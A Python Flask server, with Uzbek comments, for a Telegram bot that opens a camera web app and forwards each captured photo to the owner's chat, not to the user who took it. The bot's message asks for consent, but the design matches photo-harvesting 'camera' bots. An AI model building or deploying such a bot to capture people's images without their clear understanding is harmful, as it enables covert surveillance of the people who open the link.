"""
Telegram Camera Web App Bot — Cloud (Render) versiyasi, webhook rejimida.

Bitta Flask server uch vazifani bajaradi:
  1) "/"        -> webapp/index.html sahifasini ko'rsatadi (kamera ruxsat sahifasi)
  2) "/webhook" -> Telegramdan kelgan yangilanishlarni qabul qiladi (masalan /start)
  3) "/upload"  -> webapp'dan kelgan rasmni qabul qilib, OWNER_CHAT_ID ga yuboradi

Bu versiya doimiy "polling" o'rniga "webhook" ishlatadi, shuning uchun
Render kabi bepul bulutli serverlarda (kompyuter o'chirilgan holda ham)
doimiy ishlaydi.

Kerakli environment o'zgaruvchilari (Render dashboardida sozlanadi):
  BOT_TOKEN      - BotFather bergan token
  OWNER_CHAT_ID  - rasm yuboriladigan chat ID
  WEBAPP_URL     - shu serverning o'z ochiq manzili, masalan:
                   https://sizning-ilova.onrender.com/
"""

import os
import base64
import asyncio
import logging
import tempfile

from flask import Flask, request, jsonify, send_from_directory
from telegram import Bot, Update, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("camera-bot")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_CHAT_ID = os.environ.get("OWNER_CHAT_ID", "")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "")

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment o'zgaruvchisi topilmadi")
if not WEBAPP_URL:
    raise RuntimeError("WEBAPP_URL environment o'zgaruvchisi topilmadi (HTTPS bo'lishi shart)")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__)


@app.route("/")
def serve_webapp():
    # index.html shu faylning o'zi bilan bir papkada joylashgan
    return send_from_directory(BASE_DIR, "index.html")


@app.route("/webhook", methods=["POST"])
def telegram_webhook():
    """Telegramdan kelgan yangilanishni qabul qiladi (masalan /start buyrug'i)."""
    data = request.get_json(force=True, silent=True) or {}
    message = data.get("message", {})
    text = message.get("text", "")
    chat_id = message.get("chat", {}).get("id")

    if chat_id and text == "/start":
        asyncio.run(send_start_keyboard(chat_id))

    return jsonify({"ok": True})


async def send_start_keyboard(chat_id):
    bot = Bot(token=BOT_TOKEN)
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(
            text="📷 Kamerani ochish (ruxsat so'raladi)",
            web_app=WebAppInfo(url=WEBAPP_URL)
        )]
    ])
    await bot.send_message(
        chat_id=chat_id,
        text=(
            "Salom! Quyidagi tugmani bossangiz, kamera sahifasi ochiladi va "
            "sizdan aniq ruxsat so'raladi. Faqat siz rozi bo'lib, ruxsat "
            "bergandan keyingina rasm yuboriladi."
        ),
        reply_markup=keyboard
    )


@app.route("/upload", methods=["POST"])
def upload():
    """Webapp'dan kelgan rasmni qabul qilib, OWNER_CHAT_ID ga yuboradi."""
    data = request.get_json(force=True, silent=True) or {}
    image_data_url = data.get("image", "")

    if not image_data_url.startswith("data:image"):
        return jsonify({"ok": False, "error": "rasm formati noto'g'ri"}), 400

    try:
        header, b64data = image_data_url.split(",", 1)
        img_bytes = base64.b64decode(b64data)
    except Exception as e:
        return jsonify({"ok": False, "error": f"dekodlashda xatolik: {e}"}), 400

    tmp_path = os.path.join(tempfile.gettempdir(), "captured.jpg")
    with open(tmp_path, "wb") as f:
        f.write(img_bytes)

    async def send():
        bot = Bot(token=BOT_TOKEN)
        with open(tmp_path, "rb") as photo:
            await bot.send_photo(
                chat_id=OWNER_CHAT_ID,
                photo=photo,
                caption="📸 Kamera orqali yangi rasm keldi."
            )

    try:
        asyncio.run(send())
    except Exception as e:
        log.exception("Rasm yuborishda xatolik")
        return jsonify({"ok": False, "error": str(e)}), 500

    return jsonify({"ok": True})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
